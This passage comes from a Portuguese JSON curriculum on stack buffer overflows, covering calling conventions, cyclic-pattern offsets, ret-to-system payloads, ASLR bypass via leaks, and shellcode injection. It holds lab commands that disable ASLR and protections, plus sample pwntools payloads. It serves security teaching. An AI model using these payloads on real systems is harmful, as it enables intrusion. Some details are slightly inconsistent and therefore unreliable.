                                "Sistemas Operacionais: Syscalls e ABI de chamadas de função (x86-64).",
                                "Segurança Computacional: ROP chains e mitigações como Canary/NX.",
                                "Programação Low-Level: Assembly vs linguagens high-level (C stack frames)."
                              ],
                              "realWorldApplication": "Simulação essencial para análise de vulnerabilidades como buffer overflow em binários (ex: CVE exploits), reverse engineering de malwares e desenvolvimento de ROP payloads em CTFs/pentesters, onde controle de RET permite execução arbitrária de código."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.3",
                            "name": "Diferenciar convenções de chamada 32 e 64 bits",
                            "description": "Comparar calling conventions como stdcall/cdecl (32 bits) e System V AMD64 (64 bits), focando no posicionamento do return address na pilha.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Calling Conventions Básicas em 32 Bits (cdecl e stdcall)",
                                  "subSteps": [
                                    "Pesquise definições de cdecl e stdcall: cdecl usa pilha para parâmetros (caller limpa), stdcall usa pilha mas callee limpa.",
                                    "Identifique diferenças principais: ordem de push (direita para esquerda em ambos), limpeza da pilha.",
                                    "Compile exemplos simples em C com gcc -m32 para cdecl (padrão) e atribua stdcall via pragmas ou assembly.",
                                    "Examine código assembly gerado com objdump -d para ver instruções PUSH e CALL.",
                                    "Note que return address é pushado automaticamente pelo CALL em ambos."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as diferenças entre cdecl e stdcall, incluindo quem limpa a pilha.",
                                  "estimatedTime": "45 min",
                                  "materials": [
                                    "GCC com suporte a 32 bits",
                                    "Objdump",
                                    "Exemplos de código C simples"
                                  ],
                                  "tips": "Use -fno-stack-protector para evitar proteções modernas na pilha.",
                                  "learningObjective": "Diferenciar cdecl e stdcall em 32 bits e identificar seu impacto na pilha.",
                                  "commonMistakes": [
                                    "Confundir limpeza da pilha (caller vs callee)",
                                    "Ignorar ordem de parâmetros",
                                    "Esquecer flags de compilação para 32 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Estrutura da Pilha em 32 Bits e Posição do Return Address",
                                  "subSteps": [
                                    "Desenhe diagrama da pilha: EBP anterior, return address (logo após CALL), parâmetros (da direita para esquerda).",
                                    "Use GDB com -m32: compile binário, defina breakpoint após CALL, examine $esp e $ebp com 'x/10wx $esp'.",
                                    "Identifique return address: geralmente em [$ebp + 4] em frames com EBP.",
                                    "Teste com buffer overflow simples para ver como return address é sobrescrito.",
                                    "Compare stdcall vs cdecl via múltiplas chamadas aninhadas."
                                  ],
                                  "verification": "Capture screenshot de GDB mostrando pilha com return address destacado.",
                                  "estimatedTime": "60 min",
                                  "materials": [
                                    "GDB",
                                    "Binários 32 bits compilados",
                                    "Papel para diagramas"
                                  ],
                                  "tips": "Use 'info registers' e 'x/s $ebp+4' para strings no return address.",
                                  "learningObjective": "Visualizar e localizar return address na pilha de 32 bits.",
                                  "commonMistakes": [
                                    "Confundir ESP e EBP",
                                    "Não alinhar pilha corretamente",
                                    "Ignorar prologue/epilogue"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Calling Convention System V AMD64 em 64 Bits",
                                  "subSteps": [
                                    "Estude convenção AMD64: primeiros 6 params em RDI, RSI, RDX, RCX, R8, R9; resto na pilha; floats em XMM0-7.",
                                    "Note ausência de prologue com PUSH EBP; usa RBP para frame pointer opcionalmente.",
                                    "Compile com gcc -m64, examine com objdump: CALL pusha return address, mas params em regs.",
                                    "Use GDB 64 bits: 'x/20gx $rsp' após CALL para ver pilha (return address no topo).",
                                    "Verifique que return address está em [$rsp] imediatamente após CALL."
                                  ],
                                  "verification": "Descreva em diagrama onde params e return address ficam em 64 bits.",
                                  "estimatedTime": "50 min",
                                  "materials": [
                                    "GCC 64 bits",
                                    "GDB",
                                    "Objdump"
                                  ],
                                  "tips": "Ative frame pointers com -fno-omit-frame-pointer para facilitar debug.",
                                  "learningObjective": "Compreender passagem de parâmetros e posição do return address em 64 bits.",
                                  "commonMistakes": [
                                    "Assumir pilha para todos params",
                                    "Confundir regs caller-saved vs callee-saved",
                                    "Esquecer shadow space (32 bytes)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Convenções 32 vs 64 Bits Focando no Return Address",
                                  "subSteps": [
                                    "Crie tabela comparativa: params (pilha vs regs), limpeza (caller), alinhamento pilha (4 vs 16 bytes).",
                                    "Compile mesmo código em 32 e 64 bits, compare disassembly lado a lado.",
                                    "Simule ROP em ambos: note offset para return address (ex: 32 bits após buffer+ebp, 64 bits em rsp).",
                                    "Teste em GDB híbrido: identifique arquitetura via 'show architecture'.",
                                    "Discuta impactos em exploits: 64 bits mais difícil por ASLR/regs."
                                  ],
                                  "verification": "Preencha tabela comparativa e demonstre em GDB um exemplo de cada.",
                                  "estimatedTime": "75 min",
                                  "materials": [
                                    "Binários 32 e 64 bits",
                                    "GDB/Objdump",
                                    "Ferramenta de tabela (Excel/Google Sheets)"
                                  ],
                                  "tips": "Use radare2 ou Ghidra para visualização cross-arch.",
                                  "learningObjective": "Identificar diferenças chave, especialmente return address, entre 32 e 64 bits.",
                                  "commonMistakes": [
                                    "Ignorar convenções Windows vs Linux em 64 bits",
                                    "Não considerar endianness",
                                    "Confundir System V com Microsoft x64"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C simples com função chamando outra (ex: foo(bar(42))). Gere versões 32 e 64 bits. Use GDB para pausar após CALL interno, examine pilha: em 32 bits, return address em [ebp+4] com params acima; em 64 bits, params em regs RDI etc., return address em [rsp]. Simule overflow para sobrepor return address em ambos.",
                              "finalVerifications": [
                                "Explicar posição exata do return address em pilha 32 bits (cdecl/stdcall) vs 64 bits.",
                                "Identificar convenção em disassembly desconhecido (ex: MOV RDI vs PUSH).",
                                "Desenhar pilha correta pré/pós CALL para exemplo dado.",
                                "Calcular offset para ROP gadget em binário 32 vs 64 bits.",
                                "Discutir por que 64 bits complica buffer overflows."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de params (pilha vs regs): 25%",
                                "Correta localização de return address em diagramas/GDB: 30%",
                                "Comparação completa com exemplos práticos: 20%",
                                "Identificação de erros comuns em cenários reais: 15%",
                                "Clareza em explicações e verificações: 10%"
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language: Leitura de disassembly e regs.",
                                "Operating Systems: Gerenciamento de pilha e calling conventions.",
                                "Computer Architecture: 32 vs 64 bits, registers vs stack.",
                                "Cybersecurity: Buffer overflows e ROP exploits."
                              ],
                              "realWorldApplication": "Em análise de malware/reverse engineering, diferenciar convenções permite identificar arquitetura de binários, calcular offsets precisos para exploits (ex: ROP chains em CTFs ou pentests), e desenvolver payloads cross-platform, essencial em segurança computacional para injeção de código."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.5.2",
                        "name": "Buffer Overflow para Sobrescrever Return Address",
                        "description": "Técnica de injeção via overflow de buffer local na pilha, permitindo sobrescrever o ponteiro de retorno para redirecionar a execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.2.1",
                            "name": "Calcular offset para return address",
                            "description": "Usar ferramentas como cyclic patterns (em Python ou gdb-peda) para determinar o deslocamento exato do buffer até o saved RET em um programa vulnerável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e o programa vulnerável",
                                  "subSteps": [
                                    "Compilar um programa C simples com buffer overflow vulnerável usando flags específicas (ex: gcc -fno-stack-protector -z execstack -m32 -o vuln vuln.c).",
                                    "Instalar e configurar ferramentas como gdb com peda (gdb-peda) ou preparar script Python para cyclic patterns.",
                                    "Executar o programa em modo debug para confirmar que ele é vulnerável a overflow.",
                                    "Verificar o tamanho do buffer no código fonte (ex: char buf[64]).",
                                    "Testar input básico para confirmar crash sem ASLR (echo 0 > /proc/sys/kernel/randomize_va_space)."
                                  ],
                                  "verification": "Programa compila sem erros, executa e crasha com input longo no GDB, mostrando controle de EIP.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Código fonte vuln.c",
                                    "GCC compiler",
                                    "GDB com peda instalado",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use arquitetura 32-bit para simplicidade inicial; desative ASLR e proteções de stack.",
                                  "learningObjective": "Configurar um ambiente controlado para análise de buffer overflow.",
                                  "commonMistakes": [
                                    "Esquecer flags de compilação (-fno-stack-protector)",
                                    "Deixar ASLR ativado",
                                    "Usar 64-bit sem ajuste"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar o padrão cíclico único",
                                  "subSteps": [
                                    "No gdb-peda, usar comando 'cyclic 200' para gerar um padrão de 200 bytes.",
                                    "Alternativamente, em Python: executar script com 'from pwn import *; print(cyclic(200))' e salvar output em arquivo.",
                                    "Copiar o padrão gerado para usar como input no programa vulnerável.",
                                    "Ajustar o tamanho do padrão para exceder o buffer (ex: 100-300 bytes dependendo do buffer size).",
                                    "Verificar unicidade do padrão com 'cyclic -l <valor_EIP>' posteriormente."
                                  ],
                                  "verification": "Padrão gerado tem comprimento correto e caracteres únicos sem repetições curtas.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "GDB-peda",
                                    "Python com pwntools (pip install pwntools)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Gere padrões maiores que o buffer + padding para garantir overflow do RET.",
                                  "learningObjective": "Criar um identificador único para mapear posições de memória.",
                                  "commonMistakes": [
                                    "Gerar padrão muito curto",
                                    "Não instalar pwntools",
                                    "Confundir cyclic com patterns manuais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Injetar padrão e capturar o valor corrompido do RET",
                                  "subSteps": [
                                    "Executar gdb ./vuln, set args com o padrão (ex: run $(cat pattern.txt)).",
                                    "Quando crashar, notar o valor em EIP/RIP (ex: '0x67413241 (A1B2)').",
                                    "Usar 'cyclic -l 0x67413241' no gdb-peda para encontrar a posição exata no padrão.",
                                    "Confirmar que o crash é devido a overflow (stack trace mostra main+offset).",
                                    "Repetir se necessário com tamanhos variados para precisão."
                                  ],
                                  "verification": "Comando cyclic -l retorna um número inteiro exato (ex: 108).",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Programa vuln compilado",
                                    "Padrão cíclico gerado",
                                    "GDB-peda"
                                  ],
                                  "tips": "Use 'pattern offset <valor>' se cyclic -l falhar; foque no EIP corrompido.",
                                  "learningObjective": "Identificar o ponto exato onde o buffer transborda para o RET.",
                                  "commonMistakes": [
                                    "Não usar args corretos no gdb",
                                    "Ignorar endianness no valor EIP",
                                    "Confundir EIP com ESP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e refinar o offset calculado",
                                  "subSteps": [
                                    "Criar payload de teste: python -c 'print(\"A\"*offset + \"BBBB\")' | ./vuln.",
                                    "No gdb, confirmar que 'BBBB' controla EIP após crash.",
                                    "Ajustar offset se necessário (+/- 1-2 bytes para alinhamento).",
                                    "Documentar o offset final e testar com shellcode simples.",
                                    "Salvar offset para uso em exploits subsequentes."
                                  ],
                                  "verification": "EIP mostra exatamente o valor injetado após o offset preciso.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Offset calculado",
                                    "Python para gerar payloads",
                                    "GDB"
                                  ],
                                  "tips": "Teste com 4 bytes únicos (ex: 'AAAA', 'BBBB') para visualização clara.",
                                  "learningObjective": "Validar o offset e prepará-lo para ROP ou shellcode.",
                                  "commonMistakes": [
                                    "Offset off-by-one",
                                    "Não testar com payload real",
                                    "Esquecer alinhamento de stack"
                                  ]
                                }
                              ],
                              "practicalExample": "Programa C: int main(int argc, char** argv){char buf[64];strcpy(buf,argv[1]);}. Compile: gcc -m32 -fno-stack-protector -z execstack -o vuln vuln.c. No gdb-peda: run $(python -c 'from pwn import *;print cyclic(200)'). Crash em EIP=0x6161616b ('kaaa'). cyclic -l 0x6161616b → offset=108. Teste: python -c 'print \"A\"*108+\"BBBB\"' → EIP=0x42424242.",
                              "finalVerifications": [
                                "Offset calculado causa controle preciso de EIP com payload de teste.",
                                "Valor retornado por cyclic -l matches exatamente a posição no padrão.",
                                "Programa crasha consistentemente sem variações aleatórias (ASLR off).",
                                "Offset funciona em múltiplas execuções.",
                                "Integração com shellcode básico redireciona execução corretamente.",
                                "Documentação inclui tamanho buffer, offset e valor EIP corrompido."
                              ],
                              "assessmentCriteria": [
                                "Precisão do offset (erro <1 byte).",
                                "Correta geração e uso de cyclic patterns.",
                                "Interpretação adequada do crash e EIP.",
                                "Verificação com payloads de teste bem-sucedida.",
                                "Explicação clara do processo em relatório.",
                                "Identificação de erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de stack e strcpy.",
                                "Assembly x86: Leitura de registradores EIP/ESP.",
                                "Debugging com GDB: Breakpoints e info registers.",
                                "Scripting Python: Uso de pwntools para automação.",
                                "Matemática: Cálculo de deslocamentos em memória."
                              ],
                              "realWorldApplication": "Em pentesting e desenvolvimento de exploits (ex: CTFs como PicoCTF, ou auditorias reais), calcular offsets permite crafting de payloads para ROP chains ou shellcode injection em binários vulneráveis, essencial para bypass de proteções como NX em buffer overflows remotos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.5.2.2",
                            "name": "Explorar overflow em ambiente controlado",
                            "description": "Compilar programa C vulnerável sem proteções (nx, canary off), injetar payload para sobrescrever RET e redirecionar para endereço conhecido como system().",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente controlado e compilar programa vulnerável",
                                  "subSteps": [
                                    "Instale ferramentas necessárias: gcc, gdb, pwntools (pip install pwntools).",
                                    "Crie um programa C simples com buffer overflow vulnerável usando strcpy sem bounds check.",
                                    "Compile com flags específicas: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln (desabilita NX, canary, PIE).",
                                    "Verifique proteções ausentes com checksec (readelf ou checksec.sh).",
                                    "Execute o binário para confirmar comportamento básico sem crash."
                                  ],
                                  "verification": "checksec mostra todas proteções desabilitadas; binário executa sem erros iniciais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Linux VM (Ubuntu 20.04 32-bit), gcc, gdb, pwntools, editor de texto (vim/nano).",
                                  "tips": "Use VM isolada para segurança; teste em 32-bit para simplicidade em ROP inicial.",
                                  "learningObjective": "Entender como compilar binários sem mitigações modernas para simular cenários legados.",
                                  "commonMistakes": "Esquecer -m32 causando incompatibilidade de ponteiros; ativar proteções acidentalmente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar binário e determinar offsets necessários",
                                  "subSteps": [
                                    "Use gdb para inspecionar o binário: gdb ./vuln.",
                                    "Defina breakpoint em main e strcpy; examine stack com 'x/32wx $esp' para encontrar offset do buffer até RET.",
                                    "Use cyclic pattern (pwntools cyclic ou gdb-peda) para encontrar offset exato do RET (ex: 44 bytes).",
                                    "Identifique endereço de system() com 'p system' no gdb ou objdump -D vuln | grep system.",
                                    "Anote endereço de '/bin/sh' na libc (find /lib/i386-linux-gnu/libc.so.6 + strings | grep /bin/sh).",
                                    "verification: "
                                  ],
                                  "verification": "Offset do RET identificado (ex: 44); endereço de system() confirmado (ex: 0x804d018).",
                                  "estimatedTime": "30 minutos",
                                  "materials": "gdb, pwntools, objdump, strings, libc.so.6.",
                                  "tips": "Use gdb-peda ou gef para visualização colorida do stack; rode 'cyclic 100' para patterns fáceis.",
                                  "learningObjective": "Dominar análise estática/dinâmica para mapear stack e símbolos.",
                                  "commonMistakes": "Confundir offset em 64-bit; usar endereço ASLR-dependente sem desabilitar ASLR (echo 0 > /proc/sys/kernel/randomize_va_space)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar payload para sobrescrever RET",
                                  "subSteps": [
                                    "Gere payload: buffer de junk (offset bytes) + endereço de system() little-endian (\\x18\\xd0\\x04\\x08).",
                                    "Use pwntools: from pwn import *; payload = b'A'*44 + p32(0x804d018); print(payload).",
                                    "Teste em gdb: (gdb) r < payload.txt; observe RET sobrescrito com 'ni' até RET.",
                                    "Ajuste para incluir arg para system('/bin/sh') se necessário (simplificado para RET direto).",
                                    "Valide payload sem shell primeiro para evitar crashes prematuros."
                                  ],
                                  "verification": "Em gdb, RET é sobrescrito corretamente para system(); sem segfault imediato.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "pwntools, gdb, arquivo payload.txt.",
                                  "tips": "Little-endian: inverta bytes do endereço; teste incrementalmente (junk só, depois RET).",
                                  "learningObjective": "Construir payloads precisos para controle de fluxo via stack overflow.",
                                  "commonMistakes": "Endianness errada causando crash; offset off-by-one; ASLR ativado alterando endereços."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Injetar payload e executar exploração",
                                  "subSteps": [
                                    "Desabilite ASLR se necessário.",
                                    "Execute: echo -ne payload_hex | ./vuln ou python3 -c 'print(payload)' | ./vuln.",
                                    "Confirme shell obtida ($ prompt ou whoami).",
                                    "Em gdb para debug: (gdb) r < payload.txt; continue até shell.",
                                    "Documente saída e limpe ambiente."
                                  ],
                                  "verification": "Shell interativa obtida; comandos como id ou ls funcionam.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Terminal, gdb.",
                                  "tips": "Pipe payload com python para binário; use disown para shell persistente em gdb.",
                                  "learningObjective": "Executar overflow completo e transferir controle para função arbitrária.",
                                  "commonMistakes": "Payload com null bytes truncando string; proteções não desabilitadas."
                                }
                              ],
                              "practicalExample": "Programa vuln.c: int main(int argc, char** argv) { char buf[64]; strcpy(buf, argv[1]); return 0; }. Compile sem proteções. Payload: python3 -c \"print('A'*44 + '\\x18\\xd0\\04\\x08')\" | ./vuln → shell via system().",
                              "finalVerifications": [
                                "Binário compilado sem NX, Canary, PIE (checksec confirma).",
                                "Offset RET calculado corretamente (ex: 44 bytes).",
                                "Payload sobrescreve RET para system() sem crash inicial.",
                                "Execução fora gdb obtém shell interativa.",
                                "Endereços estáticos usados consistentemente.",
                                "Ambiente resetado sem vestígios."
                              ],
                              "assessmentCriteria": [
                                "Precisão do offset e payload (sem segfaults desnecessários).",
                                "Compreensão demonstrada via gdb stepping e stack dumps.",
                                "Execução bem-sucedida de shell com comandos básicos.",
                                "Documentação de endereços e passos reproduzíveis.",
                                "Identificação de mitigações e por que foram desabilitadas.",
                                "Segurança: uso de VM isolada."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: ponteiros, stack, funções como strcpy.",
                                "Assembly x86: compreensão de call/ret, little-endian.",
                                "Sistemas Operacionais: ASLR, NX, stack canaries.",
                                "Ferramentas de Debugging: gdb, pwntools, objdump.",
                                "Redes/Segurança: base para ROP, shellcode em exploits remotos."
                              ],
                              "realWorldApplication": "Em pentesting/CTFs, simula exploits em serviços legados (ex: old FTP servers); ensina defesa via mitigações (ASLR, RELRO); essencial para bug bounty hunters analisarem CVEs como CVE-2014-0160 Heartbleed follow-ups."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.5.2.3",
                            "name": "Burlar ASLR básico",
                            "description": "Identificar leaks de endereço ou usar partial overwrites para contornar ASLR parcial, testando em binários ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Funcionamento do ASLR em Binários ELF e PE",
                                  "subSteps": [
                                    "Estude a documentação do ASLR (Address Space Layout Randomization) para ELF (Linux) e PE (Windows).",
                                    "Compile um binário vulnerável com buffer overflow usando gcc sem proteções (-fno-stack-protector -z execstack).",
                                    "Verifique o status do ASLR com comandos como 'cat /proc/sys/kernel/randomize_va_space' no Linux ou ferramentas como Emma no Windows.",
                                    "Execute o binário múltiplas vezes e observe variações de endereços com gdb ou pwndbg.",
                                    "Compare binários com ASLR full e partial para identificar diferenças."
                                  ],
                                  "verification": "Explique em um relatório curto como o ASLR randomiza stack, heap e bibliotecas, com capturas de tela de endereços variando entre execuções.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Máquina virtual Linux (Ubuntu), gcc, gdb/pwndbg, binário de exemplo vulnerável"
                                  ],
                                  "tips": [
                                    "Use 'checksec.sh' para inspecionar proteções do binário rapidamente.",
                                    "Desabilite ASLR temporariamente com 'echo 0 > /proc/sys/kernel/randomize_va_space' para baseline."
                                  ],
                                  "learningObjective": "Entender os mecanismos de randomização de endereços e suas limitações em ASLR parcial.",
                                  "commonMistakes": [
                                    "Confundir ASLR com NX/DEP.",
                                    "Executar testes sem recompilar o binário entre mudanças de ASLR.",
                                    "Ignorar diferenças entre ELF e PE."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Leaks de Informação de Endereços",
                                  "subSteps": [
                                    "Analise o binário com ferramentas como objdump ou Ghidra para encontrar funções que imprimem dados da stack (ex: printf).",
                                    "Crie um payload que cause buffer overflow e force um leak de endereço da stack ou libc via format string ou overflow controlado.",
                                    "Capture o leak em múltiplas execuções com ASLR ativado usando netcat ou scripts Python com pwntools.",
                                    "Calcule offsets relativos entre o leak e o return address esperado.",
                                    "Teste o leak em binários ELF e PE, ajustando para diferenças arquiteturais (x86/x64)."
                                  ],
                                  "verification": "Obtenha um endereço leakado consistente relativo (ex: offset fixo da stack) em 5 execuções consecutivas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Pwntools (Python), netcat, Ghidra ou IDA Free, binário com format string vulnerability"
                                  ],
                                  "tips": [
                                    "Use '%p' em format strings para leak pointers.",
                                    "Filtre saídas com scripts para extrair hex values automaticamente."
                                  ],
                                  "learningObjective": "Localizar e explorar vazamentos de informação que revelam bases randomizadas.",
                                  "commonMistakes": [
                                    "Overwriting too much causing crash antes do leak.",
                                    "Não considerar endianness em PE vs ELF.",
                                    "Ignorar leaks parciais de 12 bits em ASLR."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Payloads com Partial Overwrites ou Leaks",
                                  "subSteps": [
                                    "Baseado no leak, construa um payload que overwrite parcial do return address (ex: últimos 12 bits fixos).",
                                    "Integre o leak em um ROP chain básico usando ROPgadget para encontrar gadgets.",
                                    "Escreva um script Python com pwntools para automatizar leak + overwrite.",
                                    "Adapte o payload para ELF (ret2libc) e PE (similar com DLLs).",
                                    "Teste em ASLR full, ajustando brute-force se necessário para partial overwrites."
                                  ],
                                  "verification": "O payload deve redirecionar controle de fluxo para um gadget ou shellcode em pelo menos 80% das execuções.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Pwntools, ROPgadget, cyclic patterns (debruijn) para encontrar offsets"
                                  ],
                                  "tips": [
                                    "Use partial overwrite em canaries ou pointers conhecidos.",
                                    "Brute-force low entropy ASLR (ex: 8 bits) com loops no script."
                                  ],
                                  "learningObjective": "Criar exploits que contornem randomização usando informações vazadas ou overwrites parciais.",
                                  "commonMistakes": [
                                    "Calcular offset errado do leak para return address.",
                                    "Não alinhar stack corretamente após overwrite.",
                                    "Esquecer de tratar null bytes em payloads."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Refinar o Bypass de ASLR",
                                  "subSteps": [
                                    "Execute o exploit completo contra o binário com ASLR ativado (nível 2).",
                                    "Meça taxa de sucesso e refine payload para consistência.",
                                    "Compare eficácia em ELF vs PE, notando diferenças em randomização.",
                                    "Adicione shellcode ou ROP para execução de código arbitrário.",
                                    "Documente o processo e limpe o ambiente (reative ASLR)."
                                  ],
                                  "verification": "Obtenha shell interativa ou execução de comando (ex: /bin/sh) em execuções repetidas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Binário final vulnerável, script pwntools completo, ambiente isolado (Docker)"
                                  ],
                                  "tips": [
                                    "Use 'setarch -R' para testes sem ASLR inicialmente.",
                                    "Monitore com strace para depuração."
                                  ],
                                  "learningObjective": "Validar e otimizar técnicas de bypass ASLR em cenários realistas.",
                                  "commonMistakes": [
                                    "Não isolar ambiente, afetando sistema host.",
                                    "Ignorar timeouts em brute-force.",
                                    "Falhar em reativar ASLR após testes."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um binário C com buffer de 64 bytes e printf(%s) no overflow. Envie payload 'A*64 + leak_pattern' para vazar endereço da stack. Use leak para calcular base da libc e ROP para system('/bin/sh'), obtendo shell apesar de ASLR ativado.",
                              "finalVerifications": [
                                "Exploit obtém controle de fluxo em 90% das execuções com ASLR nível 2.",
                                "Endereços leakados são usados corretamente para calcular offsets.",
                                "Partial overwrite ou ROP chain executa sem crashes recorrentes.",
                                "Diferenças entre ELF e PE são documentadas e tratadas.",
                                "Ambiente é restaurado com ASLR ativo após testes.",
                                "Relatório inclui capturas de shell e análise de sucesso."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de leaks (offsets corretos).",
                                "Eficiência do payload (taxa de sucesso >80%).",
                                "Automação via script pwntools funcional.",
                                "Compreensão demonstrada em relatório (explicação de ASLR parcial).",
                                "Adaptação para ambos ELF e PE.",
                                "Ausência de erros comuns como misaligned overwrites."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Desenvolvimento de payloads e análise de binários.",
                                "Sistemas Operacionais: Mecanismos de proteção de memória (ASLR, NX).",
                                "Arquitetura de Computadores: Endereçamento e layout de memória.",
                                "Criptografia: Entropia e randomização em ASLR.",
                                "Redes: Uso de netcat/pwntools para remotes exploits."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, essas técnicas demonstram o risco de buffer overflows em serviços com ASLR parcial, permitindo priorizar patches e mitigações como full ASLR ou RELRO."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.5.3",
                        "name": "Execução Arbitrária e ROP Chaining",
                        "description": "Uso do return address manipulado para executar shellcode ou encadear gadgets ROP, permitindo controle de fluxo em binários com NX/DEP ativado.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.3.1",
                            "name": "Injetar e executar shellcode via retorno",
                            "description": "Criar shellcode simples (ex: execve /bin/sh), colocá-lo no buffer overflow e apontar RET para seu endereço, validando em ambiente sem NX.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar shellcode simples para execve /bin/sh",
                                  "subSteps": [
                                    "Pesquise ou escreva shellcode em assembly x86 para chamar execve('/bin/sh', NULL, NULL).",
                                    "Use ferramentas como msfvenom ou escreva manualmente com nasm.",
                                    "Compile e extraia os bytes do shellcode (ex: \\x31\\xc0... para ~23 bytes).",
                                    "Teste o shellcode standalone em um ambiente isolado.",
                                    "Anote o tamanho exato e endereço de início esperado no stack."
                                  ],
                                  "verification": "Execute o shellcode isolado e confirme que abre um shell interativo sem crashes.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "nasm",
                                    "ld",
                                    "msfvenom (opcional)",
                                    "gdb",
                                    "Ambiente Linux x86 32-bit"
                                  ],
                                  "tips": "Use shellcode sem null bytes para evitar truncamento em strings.",
                                  "learningObjective": "Entender como shellcode invoca syscalls para spawnar shell.",
                                  "commonMistakes": [
                                    "Incluir null bytes (\\x00)",
                                    "Não alinhar registradores corretamente",
                                    "Esquecer de zerar eax antes de syscall"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar programa vulnerável sem proteções (sem NX/ASLR)",
                                  "subSteps": [
                                    "Escreva um programa C simples com buffer overflow (ex: strcpy em buffer de 64 bytes).",
                                    "Compile com flags: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln.",
                                    "Desative ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                    "Verifique com checksec: confirme NX=off, ASLR=off, Canary=off.",
                                    "Teste o crash básico com gdb para confirmar overflow."
                                  ],
                                  "verification": "checksec --file=vuln mostra proteções desabilitadas; gdb crasha com segmentation fault em overflow.",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "gcc",
                                    "checksec.sh",
                                    "gdb",
                                    "Linux x86 32-bit VM"
                                  ],
                                  "tips": "Use -m32 para 32-bit; execstack garante stack executável.",
                                  "learningObjective": "Configurar ambiente controlado para replicar vulnerabilidades reais.",
                                  "commonMistakes": [
                                    "Esquecer -fno-stack-protector",
                                    "Compilar em 64-bit",
                                    "Deixar ASLR on"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar offset de overflow e endereço do buffer",
                                  "subSteps": [
                                    "Use gdb e cyclic pattern (ex: gdb-peda cyclic 100) para encontrar offset exato do EIP.",
                                    "Defina breakpoint em main/ret; examine stack com 'x/50wx $esp'.",
                                    "Calcule endereço base do buffer (ex: esp + offset após payload).",
                                    "Anote offset (ex: 76 bytes) e endereço estável do buffer.",
                                    "Teste com python: envia payload com offset + 'BBBB' para confirmar controle de RET."
                                  ],
                                  "verification": "RET sobrescrito com 0x42424242; gdb mostra EIP=0x42424242.",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "gdb",
                                    "gdb-peda ou pwndbg",
                                    "cyclic.py de pwntools"
                                  ],
                                  "tips": "Use 'pattern offset 0xdeadbeef' para precisão.",
                                  "learningObjective": "Dominar finding de offsets e endereços stack via debugging.",
                                  "commonMistakes": [
                                    "Offset incorreto por alinhamento",
                                    "ASLR interferindo",
                                    "Não usar little-endian"
                                  ]
                                },
                                {
